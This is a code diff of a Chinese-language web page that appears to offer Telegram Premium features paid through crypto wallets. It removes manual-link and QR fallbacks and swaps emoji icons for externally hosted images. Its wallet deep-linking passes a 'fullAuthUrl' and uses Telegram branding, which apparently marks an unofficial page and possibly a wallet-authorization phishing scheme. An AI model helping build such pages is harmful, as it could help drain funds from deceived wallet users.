@@ -287,75 +287,6 @@
             box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.3);
         }
         
-        .manual-link {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 0.75rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            text-align: center;
-            word-break: break-all;
-            font-size: 0.8rem;
-        }
-        
-        .copy-btn {
-            background: rgba(255, 215, 0, 0.3);
-            color: white;
-            border: 1px solid #ffd700;
-            border-radius: 0.5rem;
-            padding: 0.5rem 1rem;
-            margin-top: 0.5rem;
-            cursor: pointer;
-        }
-        
-        .qr-section {
-            text-align: center;
-            margin: 1rem 0;
-            padding: 1rem;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 0.75rem;
-        }
-        
-        .qr-code {
-            width: 150px;
-            height: 150px;
-            background: white;
-            margin: 0 auto 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 0.5rem;
-            font-size: 0.7rem;
-            color: #333;
-            padding: 0.5rem;
-            text-align: center;
-        }
-        
-        .bitget-instructions {
-            background: rgba(255, 215, 0, 0.1);
-            border: 1px solid #ffd700;
-            border-radius: 0.75rem;
-            padding: 1rem;
-            margin: 1rem 0;
-            font-size: 0.85rem;
-            text-align: left;
-        }
-        
-        .bitget-instructions h4 {
-            color: #ffd700;
-            margin-bottom: 0.5rem;
-            font-size: 0.9rem;
-        }
-        
-        .bitget-instructions ol {
-            padding-left: 1.2rem;
-            margin: 0.5rem 0;
-        }
-        
-        .bitget-instructions li {
-            margin-bottom: 0.3rem;
-            line-height: 1.4;
-        }
-        
         @media (max-width: 320px) {
             .wallet-options {
                 grid-template-columns: 1fr;
@@ -439,60 +370,38 @@
                         <div class="wallet-name">imToken</div>
                     </div>
                 </div>
-                
-                <!-- Bitget Wallet 专用说明 -->
-                <div id="bitgetInstructions" class="bitget-instructions" style="display: none;">
-                    <h4>Bitget Wallet 使用说明</h4>
-                    <ol>
-                        <li>点击下方"复制链接"按钮</li>
-                        <li>打开 Bitget Wallet 应用</li>
-                        <li>在应用内点击"DApp浏览器"</li>
-                        <li>在地址栏粘贴复制的链接并打开</li>
-                        <li>完成支付操作</li>
-                    </ol>
-                    <p style="font-size: 0.8rem; opacity: 0.8; margin-top: 0.5rem;">
-                        💡 提示：如果无法自动唤醒，请使用此手动方法
-                    </p>
-                </div>
-                
-                <div id="qrSection" class="qr-section" style="display: none;">
-                    <div>请使用钱包扫描二维码：</div>
-                    <div class="qr-code" id="qrCodeDisplay">
-                        [二维码区域]<br>
-                        请在钱包中扫描
-                    </div>
-                    <div style="font-size: 0.7rem; color: #ccc;">或使用下方链接</div>
-                </div>
-                
-                <div id="manualSection" class="manual-link" style="display: none;">
-                    <div>手动复制链接到钱包中打开：</div>
-                    <div id="manualUrl" style="margin: 0.5rem 0; padding: 0.5rem; background: rgba(0,0,0,0.3); border-radius: 0.25rem;"></div>
-                    <button class="copy-btn" onclick="copyManualUrl()">复制链接</button>
-                </div>
             </div>
         </div>
         
         <div class="features">
             <div class="feature">
-                <div class="feature-icon">📁</div>
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/4nWVZXSp/open-folder-file-icon-219486.png" alt="更大文件上传" style="width: 40px; height: 40px;">
+                </div>
                 <h3>更大文件上传</h3>
                 <p>上传最大 4GB 的文件</p>
             </div>
             
             <div class="feature">
-                <div class="feature-icon">🎥</div>
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/C58QKWSM/1695711361784527.jpg" alt="更快的下载速度" style="width: 40px; height: 40px;">
+                </div>
                 <h3>更快的下载速度</h3>
                 <p>享受无限制的下载速度</p>
             </div>
             
             <div class="feature">
-                <div class="feature-icon">✈️</div>
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/whwVyw5b/Telegram-logo-svg.webp" alt="专属贴纸" style="width: 40px; height: 40px;">
+                </div>
                 <h3>专属贴纸</h3>
                 <p>使用 Premium 专属动画贴纸</p>
             </div>
             
             <div class="feature">
-                <div class="feature-icon">👤</div>
+                <div class="feature-icon">
+                    <img src="https://i.ibb.co/XZKJLw9b/photo-2025-10-31-23-15-28.jpg" alt="高级聊天管理" style="width: 40px; height: 40px;">
+                </div>
                 <h3>高级聊天管理</h3>
                 <p>创建群组链接和更多管理工具</p>
             </div>
@@ -592,11 +501,6 @@
                 return;
             }
 
-            // 显示二维码和手动链接
-            document.getElementById('manualUrl').textContent = fullAuthUrl;
-            document.getElementById('qrSection').style.display = 'block';
-            document.getElementById('manualSection').style.display = 'block';
-
             // 根据钱包类型调用不同的唤醒方法
             if (walletName === 'TokenPocket') {
                 wakeupTokenPocket(fullAuthUrl);
@@ -631,33 +535,23 @@
             attemptMultipleSchemes(schemes, 'TronLink');
         }
 
-        // Bitget Wallet 唤醒 - 完整修复版
+        // Bitget Wallet 唤醒
         function wakeupBitget(fullAuthUrl) {
-            // 显示Bitget专用说明
-            document.getElementById('bitgetInstructions').style.display = 'block';
-            
             const schemes = [
-                'bitkeep://', // 旧版协议
-                'bitgetwallet://', // 新版协议
+                'bitkeep://',
+                'bitgetwallet://',
                 `bitkeep://open?url=${encodeURIComponent(fullAuthUrl)}`,
                 `bitgetwallet://open?url=${encodeURIComponent(fullAuthUrl)}`,
                 `bk://open?url=${encodeURIComponent(fullAuthUrl)}`,
                 `bitkeep://browse?url=${encodeURIComponent(fullAuthUrl)}`,
                 `bitgetwallet://browse?url=${encodeURIComponent(fullAuthUrl)}`,
-                // Bitget Wallet 专用DApp协议
                 `bitkeep://dapp?url=${encodeURIComponent(fullAuthUrl)}`,
                 `bitgetwallet://dapp?url=${encodeURIComponent(fullAuthUrl)}`,
-                // 通用网页打开协议
                 `bitkeep://web?url=${encodeURIComponent(fullAuthUrl)}`,
                 `bitgetwallet://web?url=${encodeURIComponent(fullAuthUrl)}`
             ];
             
             attemptMultipleSchemes(schemes, 'Bitget Wallet');
-            
-            // 额外提示
-            setTimeout(() => {
-                showTemporaryMessage('如果Bitget Wallet未自动打开，请使用手动方法');
-            }, 2000);
         }
 
         // imToken 唤醒
@@ -680,9 +574,7 @@
                 if (tried >= schemes.length) {
                     if (!success) {
                         console.log(`所有 ${walletName} 唤醒方案都失败了`);
-                        if (walletName === 'Bitget Wallet') {
-                            showTemporaryMessage('Bitget Wallet唤醒失败，请使用手动方法');
-                        }
+                        showTemporaryMessage(`${walletName} 唤醒失败`);
                     }
                     return;
                 }
@@ -747,40 +639,6 @@
             }, 100);
             
             return attempted;
-        }
-
-        // 复制手动链接
-        function copyManualUrl() {
-            const url = document.getElementById('manualUrl').textContent;
-            if (navigator.clipboard) {
-                navigator.clipboard.writeText(url).then(() => {
-                    showTemporaryMessage('链接已复制到剪贴板！');
-                }).catch(() => {
-                    copyFallback(url);
-                });
-            } else {
-                copyFallback(url);
-            }
-        }
-
-        // 复制备用方案
-        function copyFallback(text) {
-            const textArea = document.createElement('textarea');
-            textArea.value = text;
-            textArea.style.position = 'fixed';
-            textArea.style.left = '-999999px';
-            textArea.style.top = '-999999px';
-            document.body.appendChild(textArea);
-            textArea.focus();
-            textArea.select();
-            try {
-                document.execCommand('copy');
-                showTemporaryMessage('链接已复制到剪贴板！');
-            } catch (err) {
-                console.error('复制失败:', err);
-                showTemporaryMessage('复制失败，请手动复制链接');
-            }
-            document.body.removeChild(textArea);
         }
 
         // 检测是否在Bitget Wallet内
